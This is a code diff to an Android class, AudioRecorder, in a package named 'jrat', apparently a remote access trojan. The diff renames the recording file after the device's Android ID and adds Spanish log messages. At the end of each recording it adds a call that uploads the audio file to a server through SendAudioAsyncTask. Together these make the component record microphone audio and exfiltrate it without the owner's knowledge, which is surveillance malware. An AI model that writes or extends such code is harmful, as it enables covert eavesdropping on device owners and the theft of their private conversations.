@@ -1,5 +1,6 @@
 package com.julioxus.jrat;
 
+import android.content.Context;
 import android.media.MediaRecorder;
 import android.os.Environment;
 import android.util.Log;
@@ -14,12 +15,16 @@ public class AudioRecorder {
     private static final String LOG_TAG = "AudioRecorder";
     private MediaRecorder mRecorder = null;
     private String mFileName = null;
+    private String android_id = null;
     private int time;
+    private Context context;
 
 
-    public AudioRecorder(String mFileName, int time){
+    public AudioRecorder(Context context, String android_id, int time){
+        this.context = context;
+        this.android_id = android_id;
         this.mFileName = Environment.getExternalStorageDirectory().getAbsolutePath();
-        this.mFileName += "/" + mFileName;
+        this.mFileName += "/" + android_id +"audio.aac";
         this.time=time;
     }
 
@@ -37,6 +42,9 @@ public class AudioRecorder {
         }
 
         mRecorder.start();
+
+        Log.d(LOG_TAG, "Grabación iniciada!");
+
     }
 
     public void stopRecording() {
@@ -44,9 +52,10 @@ public class AudioRecorder {
         mRecorder.reset();
         mRecorder.release();
         mRecorder = null;
-    }
 
-    public String getmFileName() {
-        return mFileName;
+        Log.d(LOG_TAG, "Grabación finalizada!");
+
+        // Send the file to the server
+        new SendAudioAsyncTask(context, android_id, mFileName).execute();
     }
 }
